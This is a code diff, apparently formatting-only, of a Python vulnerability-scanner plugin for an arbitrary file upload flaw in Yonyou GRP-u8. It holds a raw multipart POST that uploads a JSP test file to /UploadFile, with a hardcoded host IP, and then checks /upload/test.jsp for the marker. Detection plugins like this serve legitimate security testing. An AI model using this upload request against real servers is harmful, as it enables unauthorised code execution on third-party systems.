@@ -1,22 +1,23 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0026' # 平台漏洞编号，留空
-    name = '用友 GRP-u8系统任意文件上传' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    vuln_id = 'Yonyou_0026'  # 平台漏洞编号，留空
+    name = '用友 GRP-u8系统任意文件上传'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-08-10'  # 漏洞公布时间
     desc = '''
         用友 GRP-u8系统任意文件上传，可getshell  
-    ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0111406' # 漏洞来源
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0111406'  # 漏洞来源
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
@@ -24,7 +25,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = 'e7caa74d-c544-4122-8b2c-32421ecb9d1f'
     author = '国光'  # POC编写者
-    create_date = '2018-05-25' # POC创建时间
+    create_date = '2018-05-25'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -34,7 +35,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            raw='''POST /UploadFile HTTP/1.1
+            raw = '''POST /UploadFile HTTP/1.1
 Host: 210.44.112.101
 Content-Length: 227
 Cache-Control: max-age=0
@@ -52,11 +53,12 @@ Content-Type: application/octet-stream
 
 <% out.println("testvul");%>
 ------WebKitFormBoundaryVg9Q1fvRBAApMhqx--'''
-            code,head,res,errcode,finalurl=hh.http(arg+"UploadFile",raw=raw)
-            verify_url=arg+"/upload/test.jsp"
-            code,head,res,errcode,finalurl=hh.http(verify_url)
-            if code==200 and  "testvul" in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+            code, head, res, errcode, finalurl = hh.http(
+                arg+"UploadFile", raw=raw)
+            verify_url = arg+"/upload/test.jsp"
+            code, head, res, errcode, finalurl = hh.http(verify_url)
+            if code == 200 and "testvul" in res:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
         except Exception, e:
